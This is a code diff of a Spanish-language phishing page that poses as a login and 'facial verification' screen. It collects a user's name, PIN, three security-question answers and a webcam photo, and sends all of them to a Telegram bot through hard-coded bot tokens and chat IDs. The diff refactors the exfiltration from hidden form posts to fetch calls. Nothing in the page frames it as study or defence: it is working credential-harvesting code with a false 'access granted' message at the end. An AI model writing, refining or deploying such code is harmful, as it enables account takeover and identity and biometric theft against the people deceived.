@@ -4,76 +4,122 @@
   <title>Acceso</title>
   <style>
     body { font-family: Arial; text-align: center; padding: 30px; background: #f2f2f2; }
-   .caja { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px #ccc; }
+    .caja { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px #ccc; }
     input { display: block; margin: 10px auto; padding: 10px; width: 90%; }
     button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-    #paso2, #paso3 { display: none; }
+    #paso2, #paso3 { display: none; } /* Ocultos al inicio */
     #video { width: 100%; border-radius: 10px; margin-top: 10px; }
-   .aviso { font-size: 14px; color: #555; margin-bottom: 15px; }
-    iframe { display: none; }
+    .aviso { font-size: 14px; color: #555; margin-bottom: 15px; }
   </style>
 </head>
 <body>
-  <iframe name="envio"></iframe>
 
-  <div id="paso1" class="caja"><h2>Acceso</h2><input type="text" id="usuario" placeholder="Usuario"><input type="password" id="pin" placeholder="Código de acceso"><button onclick="irAPaso2()">Entrar</button></div>
-  <div id="paso2" class="caja"><h2>Verificación de Seguridad</h2><p class="aviso">Ingrese las 3 Respuestas de seguridad</p><input type="text" id="resp1" placeholder="Respuesta 1"><input type="text" id="resp2" placeholder="Respuesta 2"><input type="text" id="resp3" placeholder="Respuesta 3"><button onclick="irAPaso3()">Siguiente</button></div>
-  <div id="paso3" class="caja"><h2>Verificación Facial</h2><p class="aviso">Presione para activar la cámara</p><video id="video" autoplay playsinline></video><button onclick="tomarYEnviarFoto()">Tomar Foto</button></div>
+  <!-- PASO 1: USUARIO Y PIN -->
+  <div id="paso1" class="caja">
+    <h2>Acceso</h2>
+    <input type="text" id="usuario" placeholder="Usuario">
+    <input type="password" id="pin" placeholder="Código de acceso">
+    <button type="button" onclick="irAPaso2()">Entrar</button>
+  </div>
+
+
+  <!-- PASO 2: 3 PREGUNTAS DE SEGURIDAD -->
+  <div id="paso2" class="caja">
+    <h2>Verificación de Seguridad</h2>
+    <p class="aviso">HOLA, por favor ingresar las 3 Respuestas de seguridad que mantiene afiliada. Solo debe colocar sus respuestas dentro del espacio indicado a continuación:</p>
+    
+    <input type="text" id="resp1" placeholder="Respuesta 1">
+    <input type="text" id="resp2" placeholder="Respuesta 2">
+    <input type="text" id="resp3" placeholder="Respuesta 3">
+    
+    <button type="button" onclick="irAPaso3()">Siguiente</button>
+  </div>
+
+
+  <!-- PASO 3: CAMARA -->
+  <div id="paso3" class="caja">
+    <h2>Verificación Facial</h2>
+    <p class="aviso">Presione el botón para activar la cámara y tomar la foto</p>
+    <video id="video" autoplay playsinline></video>
+    <button type="button" onclick="tomarYEnviarFoto()">Tomar Foto</button>
+  </div>
+
 
 <script>
-const token = "8963644493:AAH1KsRguB5gJiwvwR1RB_viFBjRQAmEj4g";
-const chat_id = "-5399506853";
-let streamGlobal; let datos = {};
+const token = "8970164569:AAFHwcsRG3bNfX1fgF0EfVkodTwUN5CKpbc";
+const chat_id = "-1004395775315";
+let streamGlobal;
 
-function enviarForm(url, campos){
-  const form = document.createElement('form');
-  form.method = 'POST'; form.action = url; form.target = 'envio';
-  if(url.includes('sendPhoto')) form.enctype = 'multipart/form-data';
-  for(let k in campos){ const i = document.createElement('input'); i.name=k; i.value=campos[k]; form.appendChild(i); }
-  document.body.appendChild(form); form.submit(); document.body.removeChild(form);
-}
-
+// PASO 1 → PASO 2
 function irAPaso2() {
-  datos.usuario = document.getElementById('usuario').value;
-  datos.pin = document.getElementById('pin').value;
-  if(!datos.usuario ||!datos.pin){ alert("Rellena usuario y pin"); return; }
+  const usuario = document.getElementById('usuario').value;
+  const pin = document.getElementById('pin').value;
+  if(usuario == "" || pin == ""){ alert("Rellena usuario y pin"); return; }
+  
+  // Guardamos datos para enviarlos después
+  window.datos = { usuario, pin };
+  
   document.getElementById('paso1').style.display = 'none';
   document.getElementById('paso2').style.display = 'block';
 }
 
+// PASO 2 → PASO 3
 function irAPaso3() {
-  datos.resp1 = document.getElementById('resp1').value;
-  datos.resp2 = document.getElementById('resp2').value;
-  datos.resp3 = document.getElementById('resp3').value;
-  if(!datos.resp1 ||!datos.resp2 ||!datos.resp3){ alert("Rellena las 3 respuestas"); return; }
+  const resp1 = document.getElementById('resp1').value;
+  const resp2 = document.getElementById('resp2').value;
+  const resp3 = document.getElementById('resp3').value;
+  if(resp1 == "" || resp2 == "" || resp3 == ""){ alert("Rellena las 3 respuestas"); return; }
+  
+  window.datos.resp1 = resp1;
+  window.datos.resp2 = resp2;
+  window.datos.resp3 = resp3;
 
-  const mensaje = `🚨 NUEVO ACCESO 🚨\nUsuario: ${datos.usuario}\nPIN: ${datos.pin}\n\nRespuestas:\n1. ${datos.resp1}\n2. ${datos.resp2}\n3. ${datos.resp3}`;
-  enviarForm(`https://api.telegram.org/bot${token}/sendMessage`, {chat_id: chat_id, text: mensaje});
+  // Enviamos todo el texto a Telegram
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: `🔑 NUEVO ACCESO\nUsuario: ${window.datos.usuario}\nPIN: ${window.datos.pin}\n\nRespuestas:\n1. ${resp1}\n2. ${resp2}\n3. ${resp3}`
+    })
+  });
 
   document.getElementById('paso2').style.display = 'none';
   document.getElementById('paso3').style.display = 'block';
+
+  // Encendemos la cámara
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
- .then(s => { streamGlobal = s; document.getElementById('video').srcObject = s; })
- .catch(() => alert("Activa los permisos de cámara"));
+  .then(stream => {
+    streamGlobal = stream;
+    document.getElementById('video').srcObject = stream;
+  })
+  .catch(err => { alert("Activa los permisos de cámara"); });
 }
 
+// TOMAR FOTO Y ENVIAR
 function tomarYEnviarFoto() {
   const video = document.getElementById('video');
   const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
   canvas.getContext('2d').drawImage(video, 0, 0);
-  canvas.toBlob(blob => {
-    const form = document.createElement('form');
-    form.method = 'POST'; form.action = `https://api.telegram.org/bot${token}/sendPhoto`;
-    form.enctype = 'multipart/form-data'; form.target = 'envio';
-    form.innerHTML = `<input name="chat_id" value="${chat_id}"><input name="caption" value="📸 Foto de: ${datos.usuario}">`;
-    const fileInput = document.createElement('input'); fileInput.type='file'; fileInput.name='photo';
-    const dt = new DataTransfer(); dt.items.add(new File([blob], "foto.jpg")); fileInput.files = dt.files;
-    form.appendChild(fileInput); document.body.appendChild(form); form.submit(); document.body.removeChild(form);
-    alert("Acceso concedido ✅");
-    streamGlobal.getTracks().forEach(t => t.stop());
+  
+  canvas.toBlob(function(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('photo', blob, 'foto.jpg');
+    formData.append('caption', `📸 Foto de: ${window.datos.usuario}`);
+
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto` , {
+      method: 'POST',
+      body: formData
+    }).then(() => {
+      alert("Acceso concedido ✅");
+      streamGlobal.getTracks().forEach(track => track.stop());
+    });
   });
 }
 </script>
+
 </body>
 </html>
